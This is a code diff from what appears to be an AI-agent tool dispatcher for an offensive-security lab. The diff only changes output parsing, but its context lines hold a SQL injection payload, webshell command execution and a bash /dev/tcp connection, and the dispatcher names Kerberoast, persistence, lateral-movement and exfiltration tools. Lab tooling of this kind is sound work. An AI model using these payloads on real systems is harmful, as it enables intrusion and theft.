@@ -594,7 +594,7 @@ def _lab_dispatch_inner(fn_name: str, fn_args: dict, dry_run: bool = False) -> s
             return f"[DRY-RUN] web_request {method} {mbptl_host}:{port}{url_path}"
         cmd = f"curl -s {'-I' if method == 'HEAD' else ''} http://{mbptl_host}:{port}{url_path} 2>&1 | head -20"
         r = _lab_mcp_call(cmd, timeout=30)  # type: ignore[misc]
-        return r.get("output", "") or "[web_request: no output]"
+        return parse_sandbox_output(r.get("output", ""))[1] or "[web_request: no output]"
 
     if fn_name == "run_sqlmap":
         if not mbptl_available:
@@ -608,7 +608,7 @@ def _lab_dispatch_inner(fn_name: str, fn_args: dict, dry_run: bool = False) -> s
             f'curl -s "http://{mbptl_host}:{mbptl_web}/detail.php?id=999%20UNION%20SELECT%201,flag,NULL,NULL,NULL%20FROM%20administrator.flag--+-" 2>&1 | head -10'
         )
         r = _lab_mcp_call(cmd, timeout=30)  # type: ignore[misc]
-        return r.get("output", "") or "[run_sqlmap: no output]"
+        return parse_sandbox_output(r.get("output", ""))[1] or "[run_sqlmap: no output]"
 
     if fn_name == "upload_webshell":
         if not mbptl_available:
@@ -628,7 +628,7 @@ def _lab_dispatch_inner(fn_name: str, fn_args: dict, dry_run: bool = False) -> s
             f'echo "SHELL_UPLOADED"'
         )
         r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
-        return r.get("output", "") or "[upload_webshell: no output]"
+        return parse_sandbox_output(r.get("output", ""))[1] or "[upload_webshell: no output]"
 
     if fn_name == "webshell_exec":
         if not mbptl_available:
@@ -646,7 +646,7 @@ echo "SHELL=$SHELL_URL"
 echo "webshell_exec result: $(curl -s "$SHELL_URL?cmd={cmd_arg}" 2>&1 | head -10)"
 """
         r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
-        return r.get("output", "") or "[webshell_exec: no output]"
+        return parse_sandbox_output(r.get("output", ""))[1] or "[webshell_exec: no output]"
 
     if fn_name == "exploit_binary_service":
         if not mbptl_available:
@@ -666,7 +666,7 @@ echo "BINARY_DOWNLOADED"
 echo "banner=$(curl -s "$SHELL_URL?cmd=bash%20-c%20%27(echo%3B%20sleep%202)%20%7C%20timeout%205%20bash%20-c%20%22exec%203%3C%3E/dev/tcp/172.18.0.3/31337%3B%20cat%20%3C%263%22%202%3E%261%27" 2>&1 | head -5)"
 """
         r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
-        return r.get("output", "") or "[exploit_binary_service: no output]"
+        return parse_sandbox_output(r.get("output", ""))[1] or "[exploit_binary_service: no output]"
 
     # ── AD / Proxmox lifecycle tools ─────────────────────────────────────────
     dc = _LAB_DC or "10.10.11.21"
@@ -722,7 +722,7 @@ echo "banner=$(curl -s "$SHELL_URL?cmd=bash%20-c%20%27(echo%3B%20sleep%202)%20%7
         if dry_run:
             return f"[DRY-RUN] port scan: {target}"
         r = _lab_mcp_call(code, timeout=30)  # type: ignore[misc]
-        return r.get("output", "") or "[nmap: no output]"
+        return parse_sandbox_output(r.get("output", ""))[1] or "[nmap: no output]"
 
     if fn_name == "check_cve":
         host = fn_args.get("host", dc)
@@ -734,7 +734,7 @@ echo "banner=$(curl -s "$SHELL_URL?cmd=bash%20-c%20%27(echo%3B%20sleep%202)%20%7
         if dry_run:
             return f"[DRY-RUN] CVE check: {cve} on {host}:{port}"
         r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
-        return r.get("output", "") or "[check_cve: no output]"
+        return parse_sandbox_output(r.get("output", ""))[1] or "[check_cve: no output]"
 
     if fn_name == "exploit_service":
         # Kerberoast — best available unauthenticated-to-hash path in portal.lab
@@ -745,7 +745,7 @@ echo "banner=$(curl -s "$SHELL_URL?cmd=bash%20-c%20%27(echo%3B%20sleep%202)%20%7
         if dry_run:
             return f"[DRY-RUN] Kerberoast against {dc}"
         r = _lab_mcp_call(cmd, timeout=90)  # type: ignore[misc]
-        return r.get("output", "") or "[exploit: no output]"
+        return parse_sandbox_output(r.get("output", ""))[1] or "[exploit: no output]"
 
     if fn_name == "establish_persistence":
         method = fn_args.get("method", "cron")
@@ -759,7 +759,7 @@ echo "banner=$(curl -s "$SHELL_URL?cmd=bash%20-c%20%27(echo%3B%20sleep%202)%20%7
         if dry_run:
             return f"[DRY-RUN] persistence via {method}"
         r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
-        return r.get("output", "") or "[persist: no output]"
+        return parse_sandbox_output(r.get("output", ""))[1] or "[persist: no output]"
 
     if fn_name == "lateral_move":
         target = fn_args.get("target_host", srv)
@@ -773,7 +773,7 @@ echo "banner=$(curl -s "$SHELL_URL?cmd=bash%20-c%20%27(echo%3B%20sleep%202)%20%7
         if dry_run:
             return f"[DRY-RUN] lateral {method} to {target}"
         r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
-        return r.get("output", "") or "[lateral: no output]"
+        return parse_sandbox_output(r.get("output", ""))[1] or "[lateral: no output]"
 
     if fn_name == "exfiltrate_data":
         source = fn_args.get("source_host", srv)
@@ -781,7 +781,7 @@ echo "banner=$(curl -s "$SHELL_URL?cmd=bash%20-c%20%27(echo%3B%20sleep%202)%20%7
         if dry_run:
             return f"[DRY-RUN] exfil from {source}"
         r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
-        return r.get("output", "") or "[exfil: no output]"
+        return parse_sandbox_output(r.get("output", ""))[1] or "[exfil: no output]"
 
     return f"OK: {fn_name} completed (synthetic)."
 
